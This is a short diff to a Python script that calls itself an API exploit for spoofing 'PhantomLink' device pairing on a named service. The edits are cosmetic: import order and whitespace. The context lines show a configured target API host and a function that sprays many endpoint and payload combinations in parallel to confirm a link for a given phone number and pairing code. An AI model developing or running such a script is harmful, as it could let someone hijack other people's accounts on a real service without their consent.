@@ -1,9 +1,10 @@
 """PhantomLink GAPI Spoof — Comprehensive Handler API Exploit for Zapero/Waga"""
-import httpx
-import json
-import time
-import random
 import concurrent.futures
+import json
+import random
+import time
+
+import httpx
 
 # --- Configuration ---
 GAPI_BASE = "https://gapi-dev.waga.la/api/app"
@@ -87,7 +88,7 @@ def confirm_link_multi(phone: str, pairing_code: str) -> dict:
 
     with httpx.Client(timeout=httpx.Timeout(TIMEOUT)) as session:
         tasks = [(url, payload) for url in endpoints for payload in payload_variants]
-        
+
         with concurrent.futures.ThreadPoolExecutor(max_workers=min(len(tasks), 20)) as ex:
             futures = {
                 ex.submit(try_endpoint, session, url, payload, HEADERS): (url, payload)
